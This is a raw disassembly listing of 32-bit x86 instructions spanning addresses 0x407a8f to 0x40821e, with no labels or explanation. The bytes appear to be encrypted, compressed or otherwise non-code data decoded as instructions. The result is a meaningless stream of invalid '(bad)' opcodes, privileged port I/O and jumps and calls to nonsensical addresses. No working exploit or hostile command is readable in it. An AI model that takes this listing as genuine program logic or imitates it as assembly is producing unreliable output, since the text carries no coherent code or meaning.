  407a8f:	(bad)  
  407a90:	std    
  407a91:	mov    bl,0x75
  407a93:	pop    ds
  407a94:	push   ds
  407a95:	inc    ebp
  407a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a97:	pop    esp
  407a98:	pop    ebp
  407a99:	out    dx,al
  407a9a:	xchg   ebx,eax
  407a9b:	inc    eax
  407a9c:	push   ebx
  407a9d:	(bad)  
  407a9e:	sbb    al,BYTE PTR [ebx+eiz*8-0x68be69bc]
  407aa5:	push   0xf295459f
  407aaa:	rcr    BYTE PTR [edi+0x3528710],cl
  407ab0:	add    ah,ah
  407ab2:	pop    esi
  407ab3:	mov    eax,0x711b4866
  407ab8:	mov    esp,0xd394970b
  407abd:	xchg   esi,eax
  407abe:	and    al,BYTE PTR [ebx-0x7a86cdc7]
  407ac4:	cmp    esp,ebp
  407ac6:	ins    DWORD PTR es:[edi],dx
  407ac7:	ror    BYTE PTR [edx-0x7b55b0eb],0x7a
  407ace:	lds    edx,FWORD PTR [edx]
  407ad0:	in     al,0xdb
  407ad2:	inc    eax
  407ad3:	fcmovu st,st(2)
  407ad5:	sahf   
  407ad6:	hlt    
  407ad7:	jno    0x407ad0
  407ad9:	push   cs
  407ada:	adc    esi,0xffffffe2
  407add:	cdq    
  407ade:	pop    ds
  407adf:	mov    al,ds:0x6a84bed6
  407ae4:	mov    ds,WORD PTR [eax-0x68a9b3b0]
  407aea:	fild   QWORD PTR [edi-0x11]
  407aed:	mul    DWORD PTR [edi]
  407aef:	in     eax,0xe
  407af1:	into   
  407af2:	mov    ds:0xdda060b0,al
  407af7:	adc    edx,DWORD PTR [esi+0x1d30bcab]
  407afd:	dec    ebp
  407afe:	loop   0x407ad3
  407b00:	out    dx,eax
  407b01:	repz sub bh,BYTE PTR [ecx+0x3ccdd75d]
  407b08:	retf   0xecce
  407b0b:	or     eax,0xcaef91a8
  407b10:	stc    
  407b11:	les    ebx,FWORD PTR [eax-0x7]
  407b14:	inc    esp
  407b15:	popa   
  407b16:	rcr    ecx,1
  407b18:	outs   dx,WORD PTR ds:[esi]
  407b1a:	xchg   ebp,eax
  407b1b:	daa    
  407b1c:	ficomp DWORD PTR [ecx+0x3f]
  407b1f:	and    DWORD PTR [ecx+0x4ea39084],0x46f415ad
  407b29:	fisttp QWORD PTR [esp+edx*4-0x2a]
  407b2d:	push   0xffffffc8
  407b2f:	fldenv [edx]
  407b31:	outs   dx,DWORD PTR ds:[esi]
  407b32:	push   ebx
  407b33:	xor    DWORD PTR [ebp-0x2e5271c],esp
  407b39:	dec    esi
  407b3a:	pop    ecx
  407b3b:	pop    ds
  407b3c:	dec    ecx
  407b3d:	jmp    0x407b4e
  407b3f:	ret    0x1a39
  407b42:	and    eax,0x40998078
  407b47:	jmp    0x407adb
  407b49:	iret   
  407b4a:	ds push 0x9
  407b4d:	into   
  407b4e:	xlat   BYTE PTR ds:[ebx]
  407b4f:	je     0x407b77
  407b51:	sub    DWORD PTR [edx+0x7a],0x6292fa43
  407b58:	sbb    DWORD PTR [ebp-0x3b6bc7bf],0xc
  407b5f:	(bad)  
  407b60:	ror    BYTE PTR [ecx],0x19
  407b63:	mov    fs,edx
  407b65:	mov    ds:0xafb62c83,eax
  407b6a:	cmp    BYTE PTR [ecx],0x3
  407b6d:	mov    esp,0xe8dd60a1
  407b72:	and    DWORD PTR [esi-0x4d9de840],ebx
  407b78:	cmp    al,BYTE PTR [edx-0x8]
  407b7b:	jmp    0x407baa
  407b7d:	repnz xchg ebx,eax
  407b7f:	test   al,0x1e
  407b82:	fisub  DWORD PTR [ebx+0x70]
  407b85:	cvtps2pi mm6,QWORD PTR ds:0xf209b952
  407b8c:	inc    eax
  407b8d:	jbe    0x407b51
  407b8f:	gs xchg ecx,eax
  407b91:	sbb    dh,BYTE PTR [ecx-0x512578d0]
  407b97:	cmc    
  407b98:	push   0x93bac737
  407b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b9e:	push   es
  407b9f:	sub    eax,0x43031758
  407ba4:	cmp    BYTE PTR [ecx],al
  407ba6:	cli    
  407ba7:	test   al,0xfa
  407ba9:	push   edx
  407baa:	mov    al,ds:0x86fd0ee0
  407baf:	xor    DWORD PTR [eax+ebp*4],ebx
  407bb2:	adc    bh,0xc2
  407bb5:	cmp    BYTE PTR [edx-0x53],bl
  407bb8:	cdq    
  407bb9:	cs cmp eax,0xcb604904
  407bbf:	inc    esi
  407bc0:	dec    ebx
  407bc1:	int3   
  407bc2:	inc    edi
  407bc3:	inc    esp
  407bc4:	out    dx,al
  407bc5:	fisttp DWORD PTR [edx]
  407bc7:	icebp  
  407bc8:	sar    DWORD PTR [ebp+0x73ba83af],1
  407bce:	dec    ecx
  407bcf:	inc    eax
  407bd0:	inc    ebp
  407bd1:	pusha  
  407bd2:	mov    bl,0xbc
  407bd4:	pushf  
  407bd5:	jo     0x407ba6
  407bd7:	(bad)  
  407bd8:	sbb    BYTE PTR [ebx],bh
  407bda:	retf   
  407bdb:	call   0x9b48e1b7
  407be0:	(bad)  
  407be2:	sub    bh,BYTE PTR [ebx-0x2119032c]
  407be8:	ins    DWORD PTR es:[edi],dx
  407be9:	and    eax,0xa570eeff
  407bee:	pop    ebp
  407bef:	dec    esp
  407bf0:	pop    edi
  407bf1:	dec    esi
  407bf2:	mov    bh,0x8
  407bf4:	int3   
  407bf5:	dec    ebx
  407bf6:	xchg   BYTE PTR [ebp+edi*1+0x4ff9b692],ch
  407bfd:	std    
  407bfe:	xchg   esp,eax
  407bff:	and    al,0xe2
  407c01:	fmul   QWORD PTR [ebp+eiz*4-0x638a0f41]
  407c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c09:	jmp    0x73719e66
  407c0e:	outs   dx,BYTE PTR ds:[esi]
  407c0f:	jae    0x407c81
  407c11:	add    al,al
  407c13:	enter  0xf60e,0x18
  407c17:	dec    esi
  407c18:	jo     0x407c2f
  407c1a:	call   0xbfc4:0x8c20c5f3
  407c21:	leave  
  407c22:	push   ss
  407c23:	test   eax,0x7c954591
  407c28:	mov    eax,0xa2516d95
  407c2d:	cli    
  407c2e:	pop    ebx
  407c2f:	es add eax,0xccdb42c5
  407c35:	fidivr WORD PTR [esi+0x6e]
  407c38:	pop    eax
  407c39:	jecxz  0x407bc5
  407c3b:	xlat   BYTE PTR ds:[ebx]
  407c3c:	inc    ebp
  407c3d:	sbb    al,0x59
  407c3f:	inc    eax
  407c40:	pop    ebp
  407c41:	inc    esi
  407c42:	mov    DWORD PTR [esi+0x16d95151],ecx
  407c48:	push   esi
  407c49:	xchg   BYTE PTR [ebp-0x5c],bl
  407c4c:	mov    ebp,0xd7bceac8
  407c51:	cwde   
  407c52:	int3   
  407c53:	scas   al,BYTE PTR es:[edi]
  407c54:	add    ch,bh
  407c56:	and    eax,0xc5b63fc3
  407c5b:	xchg   ebx,eax
  407c5c:	jecxz  0x407c15
  407c5e:	bound  esi,QWORD PTR [esi]
  407c60:	cmp    eax,0x50195a3c
  407c65:	jbe    0x407c60
  407c67:	cmp    ch,BYTE PTR [ebx]
  407c69:	popf   
  407c6a:	mov    eax,ds:0x47ef4b0e
  407c6f:	mov    ebx,DWORD PTR [esi+0x64]
  407c72:	inc    ecx
  407c73:	add    BYTE PTR [edx+0xa],dl
  407c76:	sub    ah,BYTE PTR es:[ecx-0x66]
  407c7a:	sbb    DWORD PTR [ebx],ebx
  407c7c:	sbb    dl,BYTE PTR [ecx]
  407c7e:	rol    DWORD PTR [edi-0x2d1b6af3],cl
  407c84:	fisttp DWORD PTR [ecx-0x1d]
  407c87:	aaa    
  407c88:	repz cmp al,0x1d
  407c8b:	adc    DWORD PTR [ecx],esi
  407c8d:	cld    
  407c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c8f:	xchg   esp,eax
  407c90:	repnz sbb eax,0x3ab785b7
  407c96:	data16 std 
  407c98:	jg     0x407c2a
  407c9a:	std    
  407c9b:	jle    0x407cf4
  407c9d:	loop   0x407d1c
  407c9f:	jbe    0x407ca7
  407ca1:	jbe    0x407cc0
  407ca3:	pushf  
  407ca4:	inc    ebp
  407ca5:	xchg   ebx,eax
  407ca6:	sub    ch,BYTE PTR [eax-0x56]
  407ca9:	push   esi
  407caa:	hlt    
  407cab:	or     dl,ch
  407cad:	push   ds
  407cae:	lea    esi,[ebp+0x609fb00f]
  407cb4:	or     ecx,DWORD PTR [edi+eax*4]
  407cb7:	mov    eax,0x2d921427
  407cbc:	pmullw mm7,QWORD PTR [esi]
  407cbf:	int    0xdf
  407cc1:	inc    edx
  407cc2:	data16 out 0xf5,al
  407cc5:	(bad)  
  407cc6:	aad    0x2f
  407cc8:	daa    
  407cc9:	ins    BYTE PTR es:[edi],dx
  407cca:	pop    esp
  407ccb:	mov    ecx,0xd3b8c040
  407cd0:	in     al,dx
  407cd1:	test   eax,0x9b53605d
  407cd6:	pop    edx
  407cd7:	data16 mov bh,0xdc
  407cda:	inc    eax
  407cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cdc:	cmp    ah,BYTE PTR [ebx]
  407cde:	dec    ebx
  407cdf:	xchg   edx,eax
  407ce0:	dec    ebx
  407ce1:	sub    al,0xde
  407ce3:	(bad)  
  407ce4:	dec    ebx
  407ce5:	mov    esp,0x8713de5d
  407cea:	out    dx,eax
  407ceb:	popa   
  407cec:	retf   
  407ced:	add    bl,BYTE PTR [esi+0x22]
  407cf0:	add    BYTE PTR [eax+0x1369bc97],bl
  407cf6:	add    al,0x32
  407cf8:	aam    0x81
  407cfa:	aas    
  407cfb:	test   DWORD PTR [esi+0x12d9847],eax
  407d01:	scas   al,BYTE PTR es:[edi]
  407d02:	neg    BYTE PTR [edx]
  407d04:	stos   BYTE PTR es:[edi],al
  407d05:	das    
  407d06:	dec    esp
  407d07:	addr16 push esp
  407d09:	mov    ah,bl
  407d0b:	mov    al,0xe3
  407d0d:	outs   dx,DWORD PTR ds:[esi]
  407d0e:	int3   
  407d0f:	xchg   edx,eax
  407d10:	(bad)  
  407d11:	mov    al,0x3a
  407d13:	xchg   edi,eax
  407d14:	les    ebx,FWORD PTR [edx+0x6258bc1f]
  407d1a:	lock fistp WORD PTR [edi]
  407d1d:	out    dx,eax
  407d1e:	mov    dl,0x48
  407d20:	shl    BYTE PTR [esi],cl
  407d22:	push   ss
  407d23:	mov    eax,ds:0xfde97c33
  407d28:	pop    esi
  407d29:	fnsave [ecx]
  407d2b:	outs   dx,DWORD PTR ds:[esi]
  407d2c:	stc    
  407d2d:	test   eax,0xca5a11cb
  407d32:	cmp    BYTE PTR [ecx-0x1d],cl
  407d35:	mov    ch,0x58
  407d37:	nop
  407d38:	adc    al,0xa9
  407d3a:	int3   
  407d3b:	leave  
  407d3c:	fisubr DWORD PTR [esi]
  407d3e:	loop   0x407cf8
  407d40:	fwait
  407d41:	sub    eax,0xeb20a1e7
  407d46:	js     0x407d05
  407d48:	popf   
  407d49:	clc    
  407d4a:	xchg   esi,eax
  407d4b:	xor    bh,dl
  407d4d:	push   edi
  407d4e:	jo     0x407d43
  407d50:	cmp    BYTE PTR [eax],bh
  407d52:	or     esp,DWORD PTR [ebx+0xa]
  407d55:	js     0x407d7e
  407d57:	sbb    ah,BYTE PTR [ecx]
  407d59:	jge    0x407dd0
  407d5b:	(bad)  
  407d5c:	xlat   BYTE PTR ds:[ebx]
  407d5d:	ss aaa 
  407d5f:	xlat   BYTE PTR ds:[ebx]
  407d60:	bound  edi,QWORD PTR [eax]
  407d62:	adc    BYTE PTR [ebp-0x1328202a],0x5
  407d69:	scas   al,BYTE PTR es:[edi]
  407d6a:	mov    bl,0x69
  407d6c:	xchg   esp,eax
  407d6d:	scas   al,BYTE PTR es:[edi]
  407d6e:	retf   
  407d6f:	pop    esp
  407d70:	repz cmp eax,0xd51381e2
  407d76:	in     al,dx
  407d77:	dec    eax
  407d78:	xchg   esi,eax
  407d79:	cmp    al,0x6f
  407d7b:	xchg   ebp,eax
  407d7c:	xchg   esp,eax
  407d7d:	jl     0x407d38
  407d7f:	adc    BYTE PTR [eax],ah
  407d81:	sub    edx,edi
  407d83:	ins    BYTE PTR es:[edi],dx
  407d84:	daa    
  407d85:	jle    0x407d3c
  407d87:	or     edi,eax
  407d89:	cs mov ecx,0x4026da26
  407d8f:	xor    cl,BYTE PTR [edx+0x18f95577]
  407d95:	sbb    BYTE PTR [edi],0x56
  407d98:	call   0xa83f:0x43cbefa
  407d9f:	xchg   ecx,eax
  407da0:	(bad)  
  407da1:	jg     0x407db3
  407da3:	fwait
  407da4:	and    ah,BYTE PTR [eax+0x59]
  407da7:	adc    edi,DWORD PTR [eax]
  407da9:	jg     0x407d80
  407dab:	mov    eax,0x69d312c9
  407db0:	shr    al,cl
  407db2:	test   eax,0x1089f89e
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     dl,BYTE PTR [ecx]
  407dd1:	into   
  407dd2:	pop    esp
  407dd3:	pop    eax
  407dd4:	adc    cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407e22
  407ddd:	dec    edx
  407dde:	mov    ecx,0x63d42c8b
  407de3:	gs nop
  407de5:	shr    DWORD PTR fs:[edx+0x1c25edf8],1
  407dec:	js     0x407d6e
  407dee:	and    BYTE PTR [ecx-0x10ff78db],dl
  407df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df5:	add    DWORD PTR [eax*4+0x7ab31ae],ecx
  407dfc:	gs dec edi
  407dfe:	mov    esi,DWORD PTR [ebx-0x1f]
  407e01:	cmp    eax,0x2feb2c8a
  407e06:	aaa    
  407e07:	daa    
  407e08:	outs   dx,BYTE PTR ds:[esi]
  407e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e0a:	sbb    eax,0x446f9e3c
  407e0f:	add    BYTE PTR [ebp*4-0x627bfdcc],dl
  407e16:	sub    bl,BYTE PTR [edx-0x281b7d7b]
  407e1c:	xchg   esi,eax
  407e1d:	out    0x2a,al
  407e1f:	in     eax,dx
  407e20:	or     BYTE PTR [edx+0x46],ah
  407e23:	pop    ebx
  407e24:	loope  0x407dca
  407e26:	pop    ecx
  407e27:	mov    ds:0xad280105,eax
  407e2c:	fsubr  DWORD PTR [esi]
  407e2e:	(bad)  
  407e2f:	(bad)  [ebx-0x7bba6e32]
  407e35:	(bad)  
  407e36:	cdq    
  407e37:	inc    esi
  407e38:	inc    edx
  407e39:	mov    gs,edi
  407e3b:	sub    BYTE PTR [edx+0x65],0xbb
  407e3f:	retf   0x757f
  407e42:	mov    cl,0xd0
  407e44:	mov    edx,DWORD PTR gs:[ebx+0x75]
  407e48:	fisttp DWORD PTR [edx+edi*2-0xf]
  407e4c:	sub    edi,DWORD PTR [eax]
  407e4e:	lods   eax,DWORD PTR ds:[esi]
  407e4f:	punpckldq mm4,DWORD PTR [ebp-0x1bcb3273]
  407e56:	cmp    ebp,edi
  407e58:	or     DWORD PTR [eax+0x8],edi
  407e5b:	idiv   BYTE PTR [ecx+0x53]
  407e5e:	imul   edi,DWORD PTR [edi-0x59],0xffffffaa
  407e62:	mov    esi,ebx
  407e64:	xor    BYTE PTR [ebx-0x738a24dc],cl
  407e6a:	scas   eax,DWORD PTR es:[edi]
  407e6b:	mov    ebx,0xd21160fe
  407e70:	pop    esi
  407e71:	std    
  407e72:	jge    0x407e07
  407e74:	setb   BYTE PTR [ecx-0x6f9f9adb]
  407e7b:	and    esi,DWORD PTR [eax+0x7b823a6c]
  407e81:	pop    ebp
  407e82:	mov    al,0xba
  407e84:	rcl    BYTE PTR [eax+ebp*8-0x10e24290],0x9d
  407e8c:	inc    ecx
  407e8d:	mov    ebx,0x539ba5e8
  407e92:	div    DWORD PTR [ecx-0x35ad8580]
  407e98:	ror    BYTE PTR [ecx],cl
  407e9a:	stos   BYTE PTR es:[edi],al
  407e9b:	int3   
  407e9c:	push   edx
  407e9d:	xchg   ch,cl
  407e9f:	lock outs dx,DWORD PTR ds:[esi]
  407ea1:	adc    eax,0xcf2ca4c3
  407ea6:	adc    al,0xda
  407ea8:	imul   ebp,DWORD PTR [ecx+0x3d8140f2],0x52
  407eaf:	stos   BYTE PTR es:[edi],al
  407eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb1:	bound  edx,QWORD PTR [ebp-0x18ca941a]
  407eb7:	xchg   esp,eax
  407eb8:	(bad)  [eax]
  407eba:	sar    esi,0x83
  407ebd:	cmp    eax,0xfb47b07f
  407ec2:	cmp    dh,BYTE PTR [eax+edi*4]
  407ec5:	out    0x63,eax
  407ec7:	adc    dl,BYTE PTR [ecx-0x70]
  407eca:	in     eax,dx
  407ecb:	(bad)  
  407ecc:	shr    eax,cl
  407ece:	inc    esi
  407ecf:	xchg   DWORD PTR [ebx-0x10d42d6],edx
  407ed5:	addr16 mov bh,0xf9
  407ed8:	xchg   ebp,eax
  407ed9:	mov    bh,0x97
  407edb:	jmp    0x2c952502
  407ee0:	mov    dl,0x77
  407ee2:	push   ebx
  407ee3:	push   eax
  407ee4:	lods   al,BYTE PTR ds:[esi]
  407ee5:	sbb    al,BYTE PTR [edx-0x49fc4a97]
  407eeb:	push   0x6e
  407eed:	out    dx,eax
  407eee:	imul   ecx,edi,0x1a
  407ef1:	(bad)  
  407ef2:	push   ecx
  407ef3:	js     0x407f45
  407ef5:	lods   al,BYTE PTR ds:[esi]
  407ef6:	mov    bl,0x1c
  407ef8:	sbb    bl,BYTE PTR [edx+0x13f75308]
  407efe:	mov    esi,0x24747c6a
  407f03:	mov    cl,0x2b
  407f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f06:	pop    ebx
  407f07:	popa   
  407f08:	fcmovu st,st(1)
  407f0a:	push   edx
  407f0b:	or     edx,DWORD PTR [edx-0x60]
  407f0e:	int3   
  407f0f:	xchg   esi,eax
  407f10:	push   0xf993835
  407f15:	push   cs
  407f16:	rol    al,0x42
  407f19:	adc    ebx,edi
  407f1b:	inc    ebx
  407f1c:	iret   
  407f1d:	pop    eax
  407f1e:	sbb    DWORD PTR [ebx+0x274d443e],0xffffffb5
  407f25:	add    BYTE PTR [esi],dl
  407f27:	push   edx
  407f28:	fprem  
  407f2a:	xchg   DWORD PTR [edx+0x53803433],edx
  407f30:	cli    
  407f31:	pop    edx
  407f32:	sub    al,0x55
  407f34:	xor    ch,BYTE PTR [ecx+0x74]
  407f37:	jmp    0x3aff97f0
  407f3c:	stos   BYTE PTR es:[edi],al
  407f3d:	mov    ds:0x8a796a0d,al
  407f42:	lahf   
  407f43:	hlt    
  407f44:	jle    0x407eef
  407f46:	sub    edi,DWORD PTR [eax+0xdf46bab]
  407f4c:	call   0x3ae3371b
  407f51:	sbb    dh,BYTE PTR [ebx-0x66f95e49]
  407f57:	clc    
  407f58:	test   al,0x3a
  407f5a:	out    dx,al
  407f5b:	lea    ecx,[ebx]
  407f5d:	dec    edx
  407f5e:	inc    edi
  407f5f:	xchg   ecx,eax
  407f60:	lods   al,BYTE PTR ds:[esi]
  407f61:	jg     0x407fd2
  407f63:	aam    0x7c
  407f65:	popa   
  407f66:	pop    eax
  407f67:	ja     0x407f3b
  407f69:	sbb    al,0x18
  407f6b:	enter  0x784c,0xaa
  407f6f:	pop    esp
  407f70:	and    eax,0x1f448a0
  407f75:	mov    al,0x4d
  407f77:	int    0x3d
  407f79:	je     0x407f96
  407f7b:	(bad)  
  407f7c:	sub    cl,BYTE PTR [ecx+0x4b]
  407f7f:	jns    0x407fd5
  407f81:	das    
  407f82:	mov    BYTE PTR [esi],0x57
  407f85:	adc    eax,0xcf682331
  407f8a:	int    0x2c
  407f8c:	pusha  
  407f8d:	pop    ebp
  407f8e:	addr16 mov eax,0xc19fc174
  407f94:	ror    BYTE PTR [edx+0x6263ccb5],1
  407f9a:	push   ecx
  407f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9c:	imul   BYTE PTR fs:[ecx-0x39]
  407fa0:	xchg   esi,eax
  407fa1:	test   al,0x50
  407fa3:	in     al,0xfd
  407fa5:	add    eax,DWORD PTR [edx]
  407fa7:	xchg   esi,eax
  407fa8:	rcl    BYTE PTR [ecx+0x3c],cl
  407fab:	call   DWORD PTR [edx+0x1630d72a]
  407fb1:	inc    ebp
  407fb2:	dec    edx
  407fb3:	inc    edx
  407fb4:	and    ebp,0x1be1f32
  407fba:	inc    eax
  407fbb:	daa    
  407fbc:	enter  0x1711,0xe7
  407fc0:	clc    
  407fc1:	out    dx,eax
  407fc2:	jnp    0x407fd7
  407fc4:	(bad)  
  407fc5:	aas    
  407fc6:	ds xchg dl,bh
  407fc9:	pop    ebx
  407fca:	pop    es
  407fcb:	jge    0x407f83
  407fcd:	add    ecx,ecx
  407fcf:	int3   
  407fd0:	mov    eax,0xdc55716
  407fd5:	lods   al,BYTE PTR ds:[esi]
  407fd6:	push   eax
  407fd7:	push   edi
  407fd8:	jb     0x40800e
  407fda:	push   0x629a3ccc
  407fdf:	xchg   edx,eax
  407fe0:	xor    al,0xec
  407fe2:	fnsave [ecx+0x14]
  407fe5:	div    DWORD PTR [ecx+0x53075c29]
  407feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fec:	push   es
  407fed:	or     esi,DWORD PTR [ebp+0x1c497673]
  407ff3:	stos   DWORD PTR es:[edi],eax
  407ff4:	cmp    cl,BYTE PTR [edx+0xe]
  407ff7:	into   
  407ff8:	cmp    DWORD PTR [esi],eax
  407ffa:	xor    DWORD PTR [edx-0x28],esp
  407ffd:	rcl    DWORD PTR [edi+0x7b],0x46
  408001:	das    
  408002:	sbb    BYTE PTR [ebp+edx*4+0x2caf5589],al
  408009:	mov    dh,BYTE PTR [ebp-0x6d]
  40800c:	xor    eax,0x985bda6b
  408011:	sbb    eax,0x5bb500a0
  408016:	inc    esi
  408017:	sbb    edi,DWORD PTR [ebx]
  408019:	sub    DWORD PTR [edi+0x6e],0x7d
  40801d:	repnz pushf 
  40801f:	sbb    ebx,ebx
  408021:	and    BYTE PTR [ebx],bh
  408023:	or     al,0x3d
  408025:	pop    edi
  408026:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408028:	push   edi
  408029:	jo     0x407ff9
  40802b:	dec    esp
  40802c:	or     al,0xb2
  40802e:	xlat   BYTE PTR ds:[ebx]
  40802f:	push   0xffffffc7
  408031:	call   0x94000831
  408036:	bound  edx,QWORD PTR ds:0x1eab4747
  40803c:	mov    al,0x4d
  40803e:	sbb    eax,0x5ce4dde3
  408043:	call   0x572:0xad5c274e
  40804a:	pop    eax
  40804b:	adc    ah,dh
  40804d:	add    BYTE PTR [ebx],dh
  40804f:	data16 xlat BYTE PTR ds:[ebx]
  408051:	jle    0x534fdfb5
  408057:	cmc    
  408058:	inc    BYTE PTR [edx+esi*8-0x3bb85928]
  40805f:	mov    bh,0x48
  408061:	(bad)  
  408062:	push   0xacd38e20
  408067:	xchg   ebx,eax
  408068:	lods   eax,DWORD PTR ds:[esi]
  408069:	cmp    ch,BYTE PTR [edx+0x38]
  40806c:	fld    TBYTE PTR [eax+eax*4]
  40806f:	mov    BYTE PTR [esi-0x18],bl
  408072:	mov    bl,0x6b
  408074:	mov    al,ds:0xa38e3a12
  408079:	cmp    DWORD PTR [esi-0x40],esp
  40807c:	push   ss
  40807d:	push   0x78fffb0b
  408082:	and    dh,bh
  408084:	(bad)  [eax+0x47]
  408087:	call   0xa395:0xfeab2d5b
  40808e:	mov    edi,0x194e9efc
  408093:	xlat   BYTE PTR ds:[ebx]
  408094:	jmp    0x72f7:0x5bdc5a7b
  40809b:	lock (bad) 
  40809e:	or     eax,0x789ea039
  4080a3:	jne    0x40802e
  4080a5:	hlt    
  4080a6:	into   
  4080a7:	scas   eax,DWORD PTR es:[edi]
  4080a8:	out    0x95,eax
  4080aa:	jns    0x408081
  4080ac:	xor    ecx,DWORD PTR [edx]
  4080ae:	mov    ch,0xc0
  4080b0:	adc    BYTE PTR [ebp-0x6918a486],ah
  4080b6:	lahf   
  4080b7:	addr16 sahf 
  4080b9:	dec    esi
  4080ba:	mov    BYTE PTR [ebp+0x42],cl
  4080bd:	(bad)  
  4080be:	xchg   esi,eax
  4080bf:	cwde   
  4080c0:	shr    BYTE PTR [edi],0xfb
  4080c3:	dec    esi
  4080c4:	out    0xbe,eax
  4080c6:	aaa    
  4080c7:	sbb    BYTE PTR [ebx-0x7d],0x13
  4080cb:	icebp  
  4080cc:	test   eax,0x94890a28
  4080d1:	and    al,0x91
  4080d3:	adc    al,0xed
  4080d5:	icebp  
  4080d6:	pop    edi
  4080d7:	mov    ah,0xd0
  4080d9:	fs (bad) 
  4080db:	test   al,0xc1
  4080dd:	add    al,0xbc
  4080df:	jmp    0x40806f
  4080e1:	add    bh,BYTE PTR [edx]
  4080e3:	(bad)  
  4080e4:	dec    ecx
  4080e5:	mov    dl,0xf8
  4080e7:	popa   
  4080e8:	cmp    BYTE PTR [ebx+0x7b],0xbd
  4080ec:	cmc    
  4080ed:	addr16 pop esi
  4080ef:	sbb    BYTE PTR [ebx-0x31],al
  4080f2:	and    ah,dl
  4080f4:	xor    DWORD PTR [ecx],ecx
  4080f6:	int3   
  4080f7:	mov    eax,ds:0x7afd0370
  4080fc:	daa    
  4080fd:	mov    BYTE PTR [edx+ebx*2],0xdd
  408101:	mov    bl,0x55
  408103:	loope  0x40810b
  408105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408106:	sub    al,0x99
  408108:	arpl   cx,bp
  40810a:	lea    eax,[eax+0x3b16daba]
  408110:	aas    
  408111:	sub    DWORD PTR [edx],0xffffffea
  408114:	xchg   edi,eax
  408115:	add    DWORD PTR [esi+esi*4-0x1a],0x72
  40811a:	push   edx
  40811b:	and    eax,0x3e933a7f
  408120:	cmp    DWORD PTR [ebx-0x3f],0xfa413c7
  408127:	add    esp,esi
  408129:	adc    esi,ebx
  40812b:	mov    ah,0x28
  40812d:	lods   al,BYTE PTR ds:[esi]
  40812e:	shl    DWORD PTR [esi+0x5d],cl
  408131:	mov    al,0x21
  408133:	ret    
  408134:	fs je  0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    ebp,DWORD PTR [ecx+0x3c]
  408157:	pop    eax
  408158:	xchg   BYTE PTR [ebx-0x2e],bl
  40815b:	jl     0x4081d9
  40815d:	xlat   BYTE PTR ds:[ebx]
  40815e:	jns    0x4081dc
  408160:	jl     0x40814d
  408162:	mov    ecx,0x9046c68a
  408167:	mov    ds:0xdca5320c,eax
  40816c:	daa    
  40816d:	int    0x2d
  40816f:	loop   0x4081ad
  408171:	inc    ebp
  408172:	icebp  
  408173:	sub    DWORD PTR [ecx-0x2b],0xb270ac90
  40817a:	fnsave [ecx]
  40817c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40817d:	lds    edi,FWORD PTR [eax-0x76e40d93]
  408183:	js     0x408177
  408185:	rcl    BYTE PTR ds:0x6ce5ceb8,1
  40818b:	mov    fs,WORD PTR [ebx-0x4bf49a80]
  408191:	rcl    BYTE PTR [ebp+0x1c],cl
  408194:	out    0x48,eax
  408196:	hlt    
  408197:	out    0x31,eax
  408199:	sbb    DWORD PTR [esi-0x1c],esp
  40819c:	sbb    esp,ecx
  40819e:	fsub   QWORD PTR [edi+ebp*1]
  4081a1:	outs   dx,BYTE PTR ds:[esi]
  4081a2:	nop
  4081a3:	jmp    0x6875e0dd
  4081a8:	xchg   edi,eax
  4081a9:	(bad)  
  4081ab:	pop    ecx
  4081ac:	ins    DWORD PTR es:[edi],dx
  4081ad:	nop
  4081ae:	push   ds
  4081af:	jns    0x408173
  4081b1:	or     cl,BYTE PTR [ebx+0x37]
  4081b4:	div    BYTE PTR [esi+0x59d82f26]
  4081ba:	rcl    BYTE PTR cs:0x2191066b,1
  4081c1:	fwait
  4081c2:	mov    al,ds:0xa81e5fcf
  4081c7:	inc    esp
  4081c8:	push   0x43
  4081ca:	or     bl,0x35
  4081cd:	push   0xffffffc4
  4081cf:	inc    ebp
  4081d0:	mov    eax,ds:0xf7516f0c
  4081d5:	xchg   edx,eax
  4081d6:	in     al,dx
  4081d7:	adc    BYTE PTR [eax],bl
  4081d9:	call   0x26a02efc
  4081de:	pop    esp
  4081df:	retf   
  4081e0:	jle    0x408167
  4081e2:	pop    eax
  4081e3:	(bad)  
  4081e4:	test   al,0x21
  4081e6:	or     al,0xfe
  4081e8:	sbb    BYTE PTR es:[ecx],bl
  4081eb:	dec    esi
  4081ec:	dec    esi
  4081ed:	test   DWORD PTR [esi],ebp
  4081ef:	jmp    0xce1da413
  4081f4:	add    eax,0x4069174d
  4081f9:	mov    DWORD PTR [eax+0x29],ebp
  4081fc:	hlt    
  4081fd:	ja     0x408242
  4081ff:	cwde   
  408200:	aam    0xe
  408202:	test   al,0x11
  408204:	(bad)  
  408206:	jg     0x408236
  408208:	pop    ss
  408209:	call   0x13ef4dc5
  40820e:	inc    edx
  40820f:	repnz mov cl,0x42
  408212:	das    
  408213:	push   ecx
  408214:	mov    bh,0x78
  408216:	pop    esp
  408217:	mov    DWORD PTR [esi+0x1e8dc12e],ebp
  40821d:	pusha  
  40821e:	and    DWORD PTR [ebx],edi
